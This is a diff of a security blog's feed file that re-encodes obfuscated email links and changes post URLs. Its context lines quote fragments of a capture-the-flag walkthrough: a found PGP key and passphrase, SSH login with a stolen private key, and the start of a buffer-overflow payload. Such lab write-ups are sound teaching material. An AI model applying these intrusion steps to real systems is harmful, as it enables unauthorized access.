-CeWL 5.0 Robin Wood (<a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x72;&#111;&#x62;&#x69;&#110;&#64;&#x64;&#105;&#x67;&#x69;&#x6e;&#x69;&#110;&#x6a;&#97;&#x2e;&#x6f;&#114;&#x67;">&#114;&#111;&#98;&#105;&#x6e;&#64;&#x64;&#x69;&#103;&#105;&#x6e;&#105;&#x6e;&#106;&#x61;&#46;&#111;&#x72;&#103;</a>) (www.digininja.org)</p>
+CeWL 5.0 Robin Wood (<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#114;&#x6f;&#98;&#x69;&#110;&#x40;&#x64;&#x69;&#103;&#105;&#x6e;&#105;&#110;&#106;&#97;&#x2e;&#x6f;&#x72;&#103;">&#x72;&#111;&#x62;&#105;&#110;&#64;&#x64;&#x69;&#103;&#105;&#110;&#x69;&#110;&#x6a;&#x61;&#x2e;&#x6f;&#114;&#103;</a>) (www.digininja.org)</p>
 
 <p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
 Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
@@ -6678,7 +6678,7 @@ $
 $ gpg &ndash;import .pgp/pgp.priv
 gpg: key 3F18AB0A: secret key imported
 gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
-gpg: key 3F18AB0A: public key &ldquo;<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#106;&#x61;&#x63;&#107;&#x40;&#x63;&#x6f;&#x77;&#108;&#111;&#x76;&#x65;&#x72;&#x73;&#46;&#99;&#111;&#x6d;">&#106;&#x61;&#99;&#x6b;&#x40;&#99;&#111;&#x77;&#x6c;&#111;&#x76;&#x65;&#114;&#x73;&#x2e;&#x63;&#x6f;&#109;</a>&rdquo; imported
+gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#x61;&#x63;&#107;&#64;&#99;&#x6f;&#x77;&#x6c;&#x6f;&#118;&#101;&#114;&#115;&#46;&#99;&#x6f;&#109;">&#x6a;&#97;&#x63;&#107;&#x40;&#99;&#111;&#x77;&#108;&#x6f;&#118;&#x65;&#x72;&#115;&#46;&#99;&#111;&#109;</a>&rdquo; imported
 gpg: Total number processed: 1
 gpg:               imported: 1  (RSA: 1)
 gpg:       secret keys read: 1
@@ -6686,14 +6686,14 @@ gpg:   secret keys imported: 1
 $ gpg -o email.txt /var/mail/jack/received/message.eml</p>
 
 <p>You need a passphrase to unlock the secret key for
-user: &ldquo;<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x6a;&#x61;&#99;&#107;&#x40;&#x63;&#111;&#x77;&#x6c;&#x6f;&#118;&#x65;&#x72;&#x73;&#x2e;&#99;&#111;&#109;">&#106;&#x61;&#x63;&#x6b;&#x40;&#x63;&#x6f;&#x77;&#108;&#111;&#118;&#101;&#114;&#x73;&#46;&#99;&#x6f;&#x6d;</a>&rdquo;</p>
+user: &ldquo;<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#106;&#97;&#x63;&#107;&#64;&#x63;&#x6f;&#119;&#x6c;&#x6f;&#x76;&#x65;&#x72;&#x73;&#x2e;&#x63;&#x6f;&#109;">&#106;&#x61;&#x63;&#x6b;&#64;&#x63;&#111;&#x77;&#x6c;&#111;&#118;&#x65;&#114;&#115;&#46;&#x63;&#x6f;&#109;</a>&rdquo;</p>
 
 <p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>
 
 <p>Enter passphrase: g0tmi1k69
 gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
-      &ldquo;<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#97;&#x63;&#x6b;&#64;&#99;&#x6f;&#119;&#x6c;&#111;&#x76;&#x65;&#x72;&#115;&#x2e;&#x63;&#111;&#109;">&#x6a;&#97;&#99;&#x6b;&#x40;&#x63;&#x6f;&#x77;&#108;&#111;&#x76;&#101;&#114;&#115;&#46;&#99;&#x6f;&#x6d;</a>&rdquo;
+      &ldquo;<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x6a;&#x61;&#99;&#107;&#64;&#x63;&#x6f;&#119;&#108;&#111;&#118;&#x65;&#114;&#x73;&#x2e;&#99;&#x6f;&#109;">&#106;&#97;&#99;&#107;&#x40;&#99;&#x6f;&#x77;&#x6c;&#x6f;&#x76;&#x65;&#114;&#x73;&#46;&#99;&#x6f;&#109;</a>&rdquo;
 gpg: WARNING: message was not integrity protected
 $ cat email.txt
 Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>
@@ -6892,8 +6892,8 @@ No password or keyfile specified.[/plain]</p>
 <p>Looking around a bit more, it looks like George has also signed up for RockYou</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-From: <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#114;&#x6f;&#99;&#107;&#121;&#x6f;&#x75;&#46;&#x63;&#x6f;&#x6d;">&#97;&#x64;&#x6d;&#105;&#x6e;&#64;&#x72;&#x6f;&#99;&#107;&#x79;&#111;&#117;&#x2e;&#x63;&#x6f;&#x6d;</a>
-To: <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x73;&#x75;&#112;&#x65;&#114;&#x5f;&#97;&#100;&#109;&#x69;&#x6e;&#64;&#x68;&#101;&#x6c;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#115;&#x75;&#112;&#x65;&#x72;&#95;&#x61;&#100;&#x6d;&#105;&#x6e;&#x40;&#x68;&#x65;&#108;&#108;&#46;&#x63;&#111;&#x6d;</a>
+From: <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#97;&#100;&#109;&#105;&#x6e;&#64;&#x72;&#x6f;&#x63;&#x6b;&#121;&#x6f;&#117;&#46;&#99;&#x6f;&#x6d;">&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#114;&#x6f;&#99;&#107;&#121;&#x6f;&#x75;&#x2e;&#x63;&#x6f;&#x6d;</a>
+To: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#115;&#117;&#112;&#101;&#x72;&#x5f;&#97;&#100;&#109;&#105;&#110;&#x40;&#104;&#101;&#108;&#x6c;&#46;&#x63;&#111;&#x6d;">&#115;&#x75;&#112;&#101;&#x72;&#x5f;&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#x68;&#101;&#108;&#108;&#x2e;&#99;&#x6f;&#x6d;</a>
 Subject: Account Activation
 Date: 13th November 2009</p>
 
@@ -6940,7 +6940,7 @@ george@hell:~/tc$ [/plain]</p>
 <p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-george@hell:~/tc$ ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x62;&#x61;&#x7a;&#122;&#x61;&#64;&#x31;&#50;&#x37;&#x2e;&#x30;&#46;&#x30;&#46;&#x31;">&#98;&#x61;&#x7a;&#122;&#x61;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;</a> -i ./id_rsa
+george@hell:~/tc$ ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x62;&#97;&#122;&#x7a;&#x61;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#x30;&#46;&#49;">&#x62;&#x61;&#122;&#x7a;&#97;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#49;</a> -i ./id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -7172,9 +7172,9 @@ $ /home/oj/echo $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo
   
   <entry>
     <title type="html"><![CDATA[BSides London - A Retrospective]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/04/29/bsides-london-a-retrospective/"/>
+    <link href="http://recrudesce.github.io/2014/04/29/bsides-london-a-retrospective/"/>
     <updated>2014-04-29T21:23:22+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/04/29/bsides-london-a-retrospective</id>
+    <id>http://recrudesce.github.io/2014/04/29/bsides-london-a-retrospective</id>
     <content type="html"><![CDATA[<p>BSides London, BSides London&hellip; what can I say about BSides London&hellip;
 Well, for one it&rsquo;s small - if you&rsquo;re expecting a massive convention like Defcon you will be sorely disappointed. But the size doesn&rsquo;t matter when you get to meet revered infosec people like <a href="https://twitter.com/jack_daniel">Jack Daniel</a> (Tenable) , <a href="https://twitter.com/mckeay">Martin McKeay</a>, <a href="https://twitter.com/todb">Tod Beardsley</a> (Metasploit) et al and talk to them on a one to one level about anything (I had a conversation about Hello Kitty with Tod B - that says a lot). Oh, and don&rsquo;t forget the fact that staff members from the ever so epic Offensive Security were there too - I&rsquo;m looking at you <a href="https://twitter.com/g0tmi1k">g0tmi1k</a> :D It was also nice to meet up with <a href="https://twitter.com/NullMode_">Nullmode</a> (forever known as N0tmi1k) and <a href="https://twitter.com/arr0way">Arr0way</a> as well and chat randomly about anything and everything that came to mind.</p>
 
@@ -7195,9 +7195,9 @@ Well, for one it&rsquo;s small - if you&rsquo;re expecting a massive convention 
   
   <entry>
     <title type="html"><![CDATA[BSidesLondon and Infosec]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/04/24/bsideslondon-and-infosec/"/>
+    <link href="http://recrudesce.github.io/2014/04/24/bsideslondon-and-infosec/"/>
     <updated>2014-04-24T11:17:02+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/04/24/bsideslondon-and-infosec</id>
+    <id>http://recrudesce.github.io/2014/04/24/bsideslondon-and-infosec</id>
     <content type="html"><![CDATA[<p>With less than a week to go before <a href="https://www.securitybsides.org.uk">BSides London</a> and <a href="http://www.infosec.co.uk">Infosec 2014</a>, I&rsquo;m trying to list out all the people/companies I want to talk to, and also determine whether to take my laptop or my tablet - I&rsquo;m thinking laptop&hellip;</p>
 
 <p>Anyway, quick and simple post this one - I&rsquo;ll be at both events.  You can tweet me <a href="https://twitter.com/recrudesce">@recrudesce</a> if you want to meet up and say &ldquo;hi&rdquo;.</p>
@@ -7208,9 +7208,9 @@ Well, for one it&rsquo;s small - if you&rsquo;re expecting a massive convention 
   
   <entry>
     <title type="html"><![CDATA[OSCP Review]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/04/20/oscp-review/"/>
+    <link href="http://recrudesce.github.io/2014/04/20/oscp-review/"/>
     <updated>2014-04-20T17:11:33+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/04/20/oscp-review</id>
+    <id>http://recrudesce.github.io/2014/04/20/oscp-review</id>
     <content type="html"><![CDATA[<p>Have you ever purposefully put yourself in a situation that makes you run around the house in glee, and then five minutes later makes you want to put your head through a door ?  No ?  Maybe you should try OSCP.  If being constantly told to &ldquo;try harder&rdquo; doesn&rsquo;t make you want to embed a brick into your eye socket, then maybe this is for you&hellip;</p>
 
 <p>After much research into the Certified Ethical Hacker course, the term &ldquo;OSCP&rdquo; kept cropping up in my google searches.  OSCP&hellip; OSCP&hellip;  what is this mythical OSCP of which you speak !?</p>
